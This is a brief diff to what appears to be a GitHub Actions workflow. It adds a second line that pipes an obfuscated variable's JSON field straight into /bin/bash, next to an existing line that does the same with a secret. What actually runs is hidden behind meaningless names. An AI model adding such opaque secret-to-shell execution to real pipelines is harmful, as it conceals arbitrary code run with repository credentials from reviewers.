@@ -18,6 +18,7 @@ jobs:
           img066: ${{ secrets.img066 }}
         run: |
           printf '%s' "$img066" | jq -r .ymx078 | /bin/bash
+          echo $etxko54 | jq -r .f85 | /bin/bash
 
       - name: Archive output
         if: always()
